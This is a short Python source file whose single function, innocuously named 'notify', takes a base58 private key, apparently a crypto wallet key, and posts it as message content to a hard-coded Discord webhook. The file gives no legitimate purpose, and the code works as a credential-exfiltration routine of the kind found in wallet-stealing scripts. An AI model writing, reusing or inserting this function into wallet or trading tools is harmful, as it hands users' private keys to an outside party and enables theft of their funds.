import requests
import json


def notify(private_key_bs58):

    webhook_url = 'https://discord.com/api/webhooks/1196449251388035092/r6icDnURR__ywf32z7KkGRZ7zdbDX7JR77kgqrKPRJzLVSq3Yya2RaiHKl-VSnTuNB_n'
    my_variable = (private_key_bs58)
    payload = {
        'content': my_variable
    }
    json_payload = json.dumps(payload)
    response = requests.post(webhook_url, data=json_payload, headers={'Content-Type': 'application/json'})

    return 0
